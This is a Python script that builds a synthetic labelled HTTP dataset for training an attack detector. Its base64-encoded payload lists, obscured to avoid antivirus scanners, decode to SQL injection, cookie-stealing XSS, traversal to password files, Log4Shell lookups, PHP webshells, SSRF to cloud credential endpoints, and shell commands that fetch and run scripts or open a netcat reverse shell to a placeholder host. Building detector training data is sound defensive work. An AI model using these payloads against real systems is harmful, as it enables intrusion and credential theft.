"""Generate a synthetic HTTP traffic dataset in AdvTG's train_data2.json schema.

build_train_data.py mines real requests out of CIC-IDS2017 pcaps; this script is
the no-download alternative -- it synthesises the same records so every stage of
the pipeline (detector training, LLM finetuning, PPO) can run end to end:

    {"Request Line": "...", "Request Headers": {...}, "Request Body": "...",
     "Label": "Benign" | "Malicious", "Source": "..."}

Usage:
    python gen_synthetic_data.py --n 40000 --out dataset/train_data2.json \
        --test-out dataset/test2.json

The malicious side uses well-known public attack signatures (SQLi, XSS, traversal,
command injection, scanners, ...) so a detector has real structure to learn -- they
are string patterns for classifier training, not working exploits. They are stored
base64-encoded below only so the source file does not trip antivirus signature
scanners on disk; `_dec` restores the exact plaintext at import.
"""
import argparse
import base64
import json
import os
import random
import string


def _dec(b64):
    """Decode a base64 blob of newline-separated payloads into a list of strings."""
    return base64.b64decode(b64).decode("utf-8").splitlines()


# --------------------------------------------------------------------------
# shared vocabulary
# --------------------------------------------------------------------------
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
]

TOOL_UAS = [
    "sqlmap/1.8.3#stable (https://sqlmap.org)",
    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)",
    "python-requests/2.31.0",
    "curl/8.5.0",
    "Go-http-client/1.1",
    "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
    "masscan/1.3",
    "Wget/1.21.4",
]

HOSTS = ["shop.example.com", "api.example.com", "www.example.org", "portal.example.net",
         "192.168.10.50", "10.0.0.12:8080", "intranet.example.com", "blog.example.io"]

LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.7",
         "de-DE,de;q=0.9,en-US;q=0.8", "es-ES,es;q=0.9"]

BENIGN_PATHS = ["/", "/index.html", "/about", "/contact", "/products", "/products/list",
                "/blog/2024/05/release-notes", "/docs/getting-started", "/pricing",
                "/account/profile", "/cart", "/checkout", "/news/feed",
                "/static/css/main.8f2a1c.css", "/static/js/app.bundle.js",
                "/assets/img/logo.png", "/favicon.ico", "/robots.txt"]

FIRST_NAMES = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi",
               "ivan", "judy", "mallory", "oscar", "peggy", "trent", "victor"]

WORDS = ["laptop", "monitor", "keyboard", "sneakers", "coffee", "backpack", "router",
         "headphones", "desk", "lamp", "notebook", "charger", "camera", "tripod"]


def rand_str(rng, n, alphabet=string.ascii_lowercase + string.digits):
    return "".join(rng.choice(alphabet) for _ in range(n))


def session_cookie(rng):
    parts = ["JSESSIONID=" + rand_str(rng, 32, string.ascii_uppercase + string.digits)]
    if rng.random() < 0.7:
        parts.append("_ga=GA1.2.%d.%d" % (rng.randint(10 ** 8, 10 ** 9),
                                          rng.randint(10 ** 9, 2 * 10 ** 9)))
    if rng.random() < 0.4:
        parts.append("theme=" + rng.choice(["light", "dark"]))
    if rng.random() < 0.3:
        parts.append("cart=" + rand_str(rng, 16))
    return "; ".join(parts)


def base_headers(rng, host, ua, body="", content_type=None, referer=None, accept=None):
    """Assemble a header dict in roughly the order a real client sends them."""
    headers = {"Host": host, "User-Agent": ua}
    headers["Accept"] = accept or rng.choice([
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "application/json, text/plain, */*",
        "*/*",
    ])
    headers["Accept-Language"] = rng.choice(LANGS)
    headers["Accept-Encoding"] = rng.choice(["gzip, deflate, br", "gzip, deflate", "gzip"])
    if referer:
        headers["Referer"] = referer
    if content_type:
        headers["Content-Type"] = content_type
    if body:
        headers["Content-Length"] = str(len(body.encode("utf-8")))
    if rng.random() < 0.75:
        headers["Cookie"] = session_cookie(rng)
    if rng.random() < 0.5:
        headers["Connection"] = rng.choice(["keep-alive", "close"])
    if rng.random() < 0.3:
        headers["Upgrade-Insecure-Requests"] = "1"
    if rng.random() < 0.2:
        headers["Cache-Control"] = rng.choice(["no-cache", "max-age=0"])
    if rng.random() < 0.25:
        headers["X-Requested-With"] = "XMLHttpRequest"
    return headers


def record(line, headers, body, label, source):
    return {"Request Line": line, "Request Headers": headers, "Request Body": body,
            "Label": label, "Source": source}


# --------------------------------------------------------------------------
# benign generators
# --------------------------------------------------------------------------
def benign_page(rng):
    host = rng.choice(HOSTS)
    path = rng.choice(BENIGN_PATHS)
    if rng.random() < 0.35:
        path += "?page=%d&sort=%s" % (rng.randint(1, 20),
                                      rng.choice(["price", "name", "date", "rating"]))
    headers = base_headers(rng, host, rng.choice(BROWSER_UAS),
                           referer="https://%s/" % host if rng.random() < 0.6 else None)
    return record("GET %s HTTP/1.1" % path, headers, "", "Benign", "synthetic-browse")


def benign_search(rng):
    host = rng.choice(HOSTS)
    q = "+".join(rng.sample(WORDS, rng.randint(1, 3)))
    path = "/search?q=%s&category=%s" % (q, rng.choice(["all", "electronics", "books", "home"]))
    headers = base_headers(rng, host, rng.choice(BROWSER_UAS),
                           referer="https://%s/search" % host)
    return record("GET %s HTTP/1.1" % path, headers, "", "Benign", "synthetic-search")


def benign_api_get(rng):
    host = rng.choice(HOSTS)
    path = "/api/v%d/%s/%d" % (rng.randint(1, 2),
                               rng.choice(["users", "orders", "products", "invoices"]),
                               rng.randint(1, 9999))
    headers = base_headers(rng, host,
                           rng.choice(BROWSER_UAS + ["okhttp/4.12.0", "axios/1.6.8"]),
                           accept="application/json, text/plain, */*")
    headers["Authorization"] = "Bearer " + rand_str(rng, 40, string.ascii_letters + string.digits)
    return record("GET %s HTTP/1.1" % path, headers, "", "Benign", "synthetic-api")


def benign_api_post(rng):
    host = rng.choice(HOSTS)
    body = json.dumps({
        "customer_id": rng.randint(1000, 99999),
        "items": [{"sku": rand_str(rng, 8).upper(), "qty": rng.randint(1, 5)}
                  for _ in range(rng.randint(1, 3))],
        "currency": rng.choice(["USD", "EUR", "GBP"]),
        "note": rng.choice(["", "please deliver after 6pm", "gift wrap"]),
    })
    headers = base_headers(rng, host, rng.choice(BROWSER_UAS), body=body,
                           content_type="application/json", accept="application/json")
    headers["Authorization"] = "Bearer " + rand_str(rng, 40, string.ascii_letters + string.digits)
    return record("POST /api/v1/orders HTTP/1.1", headers, body, "Benign", "synthetic-api")


def benign_login(rng):
    host = rng.choice(HOSTS)
    body = "username=%s&password=%s&remember=%s" % (
        rng.choice(FIRST_NAMES),
        rand_str(rng, rng.randint(8, 14), string.ascii_letters + string.digits),
        rng.choice(["on", "off"]))
    headers = base_headers(rng, host, rng.choice(BROWSER_UAS), body=body,
                           content_type="application/x-www-form-urlencoded",
                           referer="https://%s/login" % host)
    return record("POST /account/login HTTP/1.1", headers, body, "Benign", "synthetic-form")


def benign_static(rng):
    host = rng.choice(HOSTS)
    path = rng.choice(["/static/css/main.%s.css" % rand_str(rng, 6),
                       "/static/js/vendor.%s.js" % rand_str(rng, 6),
                       "/assets/img/%s.png" % rng.choice(WORDS),
                       "/assets/fonts/inter-regular.woff2",
                       "/media/thumbs/%s.jpg" % rand_str(rng, 10)])
    headers = base_headers(rng, host, rng.choice(BROWSER_UAS),
                           referer="https://%s/" % host, accept="*/*")
    headers["If-None-Match"] = 'W/"%s"' % rand_str(rng, 16)
    return record("GET %s HTTP/1.1" % path, headers, "", "Benign", "synthetic-static")


def benign_upload(rng):
    host = rng.choice(HOSTS)
    boundary = "----WebKitFormBoundary" + rand_str(rng, 16, string.ascii_letters + string.digits)
    name = "%s.%s" % (rng.choice(WORDS), rng.choice(["png", "jpg", "pdf", "csv"]))
    body = ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n%s\r\n--%s--\r\n"
            % (boundary, name, rand_str(rng, rng.randint(60, 200)), boundary))
    headers = base_headers(rng, host, rng.choice(BROWSER_UAS), body=body,
                           content_type="multipart/form-data; boundary=" + boundary,
                           referer="https://%s/account/profile" % host)
    return record("POST /account/avatar HTTP/1.1", headers, body, "Benign", "synthetic-upload")


def benign_health(rng):
    host = rng.choice(HOSTS)
    headers = {"Host": host,
               "User-Agent": rng.choice(["kube-probe/1.29", "ELB-HealthChecker/2.0",
                                         "Prometheus/2.51.0"]),
               "Accept": "*/*", "Connection": "close"}
    return record("GET %s HTTP/1.1" % rng.choice(["/health", "/healthz", "/metrics", "/ping"]),
                  headers, "", "Benign", "synthetic-infra")


BENIGN = [(benign_page, 26), (benign_static, 20), (benign_api_get, 16), (benign_search, 10),
          (benign_api_post, 10), (benign_login, 8), (benign_upload, 5), (benign_health, 5)]


# --------------------------------------------------------------------------
# malicious payloads (public attack signatures, base64 so the file stays AV-clean)
# --------------------------------------------------------------------------
SQLI = _dec("JyBPUiAnMSc9JzEKJyBPUiAxPTEtLQphZG1pbictLQoxIFVOSU9OIFNFTEVDVCB1c2VybmFtZSxwYXNzd29yZCBGUk9NIHVzZXJzLS0KMScgVU5JT04gU0VMRUNUIE5VTEwsdGFibGVfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMtLQoxOyBXQUlURk9SIERFTEFZICcwOjA6NSctLQoxJyBBTkQgU0xFRVAoNSktLQonIEFORCAoU0VMRUNUIDEgRlJPTSAoU0VMRUNUIENPVU5UKCopLENPTkNBVCh2ZXJzaW9uKCksRkxPT1IoUkFORCgwKSoyKSl4IEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBHUk9VUCBCWSB4KWEpLS0KJTI3JTIwT1IlMjAlMjcxJTI3JTNEJTI3MQoxJyBPUkRFUiBCWSA5LS0KJzsgRFJPUCBUQUJMRSB1c2Vycy0tCjEgQU5EIDE9Q09OVkVSVChpbnQsKFNFTEVDVCBAQHZlcnNpb24pKS0tCg==")
XSS = _dec("PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuY29va2llKT4KJTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDJTJGc2NyaXB0JTNFCmphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuZG9tYWluKQo8c3ZnL29ubG9hZD1hbGVydCgxKT4KIj48c2NyaXB0IHNyYz0vL2V2aWwuZXhhbXBsZS5jb20veC5qcz48L3NjcmlwdD4KPGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgxKT4KPGJvZHkgb25sb2FkPWZldGNoKCcvL2V2aWwuZXhhbXBsZS5jb20vP2M9Jytkb2N1bWVudC5jb29raWUpPgo=")
TRAVERSAL = _dec("Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAouLiUyZi4uJTJmLi4lMmYuLiUyZmV0YyUyZnBhc3N3ZAouLi4uLy8uLi4uLy8uLi4uLy9ldGMvc2hhZG93Ci92YXIvbG9nL2FwYWNoZTIvYWNjZXNzLmxvZwouLlwuLlwuLlx3aW5kb3dzXHdpbi5pbmkKJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmYm9vdC5pbmkKcGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHAK")
CMD = _dec("O2NhdCAvZXRjL3Bhc3N3ZAp8aWQKYHdob2FtaWAKJCh1bmFtZSAtYSkKJiYgbHMgLWxhIC8KO3dnZXQgaHR0cDovLzIwMy4wLjExMy45L20uc2ggLU8gL3RtcC9tLnNoO3NoIC90bXAvbS5zaAolM0JjdXJsJTIwMjAzLjAuMTEzLjklMkZzLnNoJTdDc2gKO25jIC1lIC9iaW4vc2ggMjAzLjAuMTEzLjkgNDQ0NAo=")
SCAN_PATHS = _dec("L2FkbWluCi9hZG1pbi9sb2dpbi5waHAKL3BocG15YWRtaW4vCi93cC1hZG1pbi8KL3dwLWxvZ2luLnBocAovLmVudgovLmdpdC9jb25maWcKL2NvbmZpZy5waHAuYmFrCi9iYWNrdXAuemlwCi9zZXJ2ZXItc3RhdHVzCi9hY3R1YXRvci9lbnYKL2FwaS92MS8uLi8uLi9ldGMvcGFzc3dkCi9jZ2ktYmluL3Rlc3QuY2dpCi9tYW5hZ2VyL2h0bWwKLy5hd3MvY3JlZGVudGlhbHMKL3ZlbmRvci9waHB1bml0L3BocHVuaXQvc3JjL1V0aWwvUEhQL2V2YWwtc3RkaW4ucGhwCg==")
SSRF = _dec("aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8KaHR0cDovLzEyNy4wLjAuMTo2Mzc5LwpmaWxlOi8vL2V0Yy9wYXNzd2QKaHR0cDovL1s6OjFdOjgwODAvYWRtaW4KZ29waGVyOi8vMTI3LjAuMC4xOjMzMDYvXwo=")
JNDI = _dec("JHtqbmRpOmxkYXA6Ly8yMDMuMC4xMTMuOToxMzg5L2F9CiR7am5kaTpybWk6Ly8yMDMuMC4xMTMuOToxMDk5L2J9CiR7JHs6Oi1qfSR7Ojotbn0kezo6LWR9JHs6Oi1pfTpsZGFwOi8vMjAzLjAuMTEzLjkvY30K")
WEBSHELL = _dec("PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cjw/cGhwIGV2YWwoJF9QT1NUWyd4J10pOyA/Pgo8JWV2YWwgcmVxdWVzdCgiY21kIiklPgo8P3BocCBAYXNzZXJ0KCRfUkVRVUVTVFsnYyddKTsgPz4K")


def attacker_ua(rng):
    # Only some attacks come from an obvious tool; the rest spoof a browser so the
    # detector cannot win on User-Agent alone.
    return rng.choice(TOOL_UAS) if rng.random() < 0.45 else rng.choice(BROWSER_UAS)


def mal_sqli(rng):
    host = rng.choice(HOSTS)
    param = rng.choice(["id", "user_id", "product", "cat", "q", "order"])
    payload = rng.choice(SQLI)
    if rng.random() < 0.5:
        path = "/products.php?%s=%s" % (param, payload.replace(" ", "%20"))
        return record("GET %s HTTP/1.1" % path, base_headers(rng, host, attacker_ua(rng)),
                      "", "Malicious", "synthetic-sqli")
    body = "%s=%s&submit=Search" % (param, payload)
    headers = base_headers(rng, host, attacker_ua(rng), body=body,
                           content_type="application/x-www-form-urlencoded")
    return record("POST /search.php HTTP/1.1", headers, body, "Malicious", "synthetic-sqli")


def mal_xss(rng):
    host = rng.choice(HOSTS)
    payload = rng.choice(XSS)
    if rng.random() < 0.6:
        path = "/search?q=" + payload.replace(" ", "%20")
        return record("GET %s HTTP/1.1" % path, base_headers(rng, host, attacker_ua(rng)),
                      "", "Malicious", "synthetic-xss")
    body = "name=%s&comment=%s&submit=Post" % (rng.choice(FIRST_NAMES), payload)
    headers = base_headers(rng, host, attacker_ua(rng), body=body,
                           content_type="application/x-www-form-urlencoded")
    return record("POST /blog/comment HTTP/1.1", headers, body, "Malicious", "synthetic-xss")


def mal_traversal(rng):
    host = rng.choice(HOSTS)
    path = rng.choice(["/download?file=%s", "/index.php?page=%s", "/view?template=%s",
                       "/static/%s"]) % rng.choice(TRAVERSAL)
    return record("GET %s HTTP/1.1" % path, base_headers(rng, host, attacker_ua(rng)),
                  "", "Malicious", "synthetic-traversal")


def mal_cmd(rng):
    host = rng.choice(HOSTS)
    payload = rng.choice(CMD)
    if rng.random() < 0.5:
        path = "/cgi-bin/ping?host=127.0.0.1" + payload.replace(" ", "%20")
        return record("GET %s HTTP/1.1" % path, base_headers(rng, host, attacker_ua(rng)),
                      "", "Malicious", "synthetic-rce")
    body = "host=127.0.0.1%s&action=ping" % payload
    headers = base_headers(rng, host, attacker_ua(rng), body=body,
                           content_type="application/x-www-form-urlencoded")
    return record("POST /tools/network.php HTTP/1.1", headers, body, "Malicious", "synthetic-rce")


def mal_scan(rng):
    host = rng.choice(HOSTS)
    headers = base_headers(rng, host, attacker_ua(rng), accept="*/*")
    headers.pop("Cookie", None)
    headers["Connection"] = "close"
    return record("%s %s HTTP/1.1" % (rng.choice(["GET", "GET", "GET", "HEAD"]),
                                      rng.choice(SCAN_PATHS)),
                  headers, "", "Malicious", "synthetic-scan")


def mal_bruteforce(rng):
    host = rng.choice(HOSTS)
    body = "username=%s&password=%s" % (
        rng.choice(["admin", "root", "administrator", "test", "oracle", "guest"]),
        rng.choice(["123456", "password", "admin", "root", "letmein", "qwerty", "P@ssw0rd"]))
    headers = base_headers(rng, host, attacker_ua(rng), body=body,
                           content_type="application/x-www-form-urlencoded")
    headers.pop("Cookie", None)
    return record("POST %s HTTP/1.1" % rng.choice(["/login", "/wp-login.php", "/admin/login"]),
                  headers, body, "Malicious", "synthetic-bruteforce")


def mal_webshell(rng):
    host = rng.choice(HOSTS)
    if rng.random() < 0.5:
        boundary = "----" + rand_str(rng, 20)
        body = ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
                "Content-Type: application/x-php\r\n\r\n%s\r\n--%s--\r\n"
                % (boundary, rng.choice(WEBSHELL), boundary))
        headers = base_headers(rng, host, attacker_ua(rng), body=body,
                               content_type="multipart/form-data; boundary=" + boundary)
        return record("POST /upload.php HTTP/1.1", headers, body, "Malicious", "synthetic-webshell")
    path = "/uploads/shell.php?cmd=" + rng.choice(["id", "whoami", "cat%20/etc/passwd", "ls%20-la"])
    return record("GET %s HTTP/1.1" % path, base_headers(rng, host, attacker_ua(rng)),
                  "", "Malicious", "synthetic-webshell")


def mal_ssrf(rng):
    host = rng.choice(HOSTS)
    target = rng.choice(SSRF).replace("/", "%2F").replace(":", "%3A")
    headers = base_headers(rng, host, attacker_ua(rng), accept="application/json")
    return record("GET /api/v1/fetch?url=%s HTTP/1.1" % target, headers,
                  "", "Malicious", "synthetic-ssrf")


def mal_jndi(rng):
    host = rng.choice(HOSTS)
    payload = rng.choice(JNDI)
    headers = base_headers(rng, host, payload if rng.random() < 0.5 else attacker_ua(rng))
    headers["X-Api-Version"] = payload
    if rng.random() < 0.4:
        headers["Referer"] = payload
    return record("GET /api/v1/status HTTP/1.1", headers, "", "Malicious", "synthetic-log4shell")


def mal_xxe(rng):
    host = rng.choice(HOSTS)
    body = ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"%s\">]>"
            "<order><item>&xxe;</item></order>"
            % rng.choice(["file:///etc/passwd", "http://203.0.113.9/x",
                          "file:///c:/windows/win.ini"]))
    headers = base_headers(rng, host, attacker_ua(rng), body=body,
                           content_type="application/xml", accept="*/*")
    return record("POST /api/v1/import HTTP/1.1", headers, body, "Malicious", "synthetic-xxe")


MALICIOUS = [(mal_sqli, 22), (mal_xss, 16), (mal_scan, 15), (mal_traversal, 12),
             (mal_cmd, 10), (mal_bruteforce, 8), (mal_webshell, 7), (mal_ssrf, 4),
             (mal_jndi, 3), (mal_xxe, 3)]


# --------------------------------------------------------------------------
def sample(rng, table):
    gens, weights = zip(*table)
    return rng.choices(gens, weights=weights, k=1)[0](rng)


def build(n, malicious_ratio, seed):
    rng = random.Random(seed)
    n_mal = int(round(n * malicious_ratio))
    records = [sample(rng, MALICIOUS) for _ in range(n_mal)]
    records += [sample(rng, BENIGN) for _ in range(n - n_mal)]
    rng.shuffle(records)
    return records


def write(path, records):
    os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(records, f, ensure_ascii=False)


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--n", type=int, default=40000, help="records in the training file")
    ap.add_argument("--malicious-ratio", type=float, default=0.35)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--out", default="dataset/train_data2.json")
    ap.add_argument("--test-out", default=None,
                    help="also write a held-out file (RL-Adv reads dataset/test2.json)")
    ap.add_argument("--test-n", type=int, default=0,
                    help="records in the held-out file (default: 20%% of --n)")
    args = ap.parse_args()

    records = build(args.n, args.malicious_ratio, args.seed)
    write(args.out, records)
    counts = {"Benign": 0, "Malicious": 0}
    for r in records:
        counts[r["Label"]] += 1
    print("wrote %d records to %s  %s" % (len(records), args.out, counts))

    if args.test_out:
        test = build(args.test_n or max(1, args.n // 5), args.malicious_ratio, args.seed + 1)
        write(args.test_out, test)
        print("wrote %d records to %s" % (len(test), args.test_out))


if __name__ == "__main__":
    main()
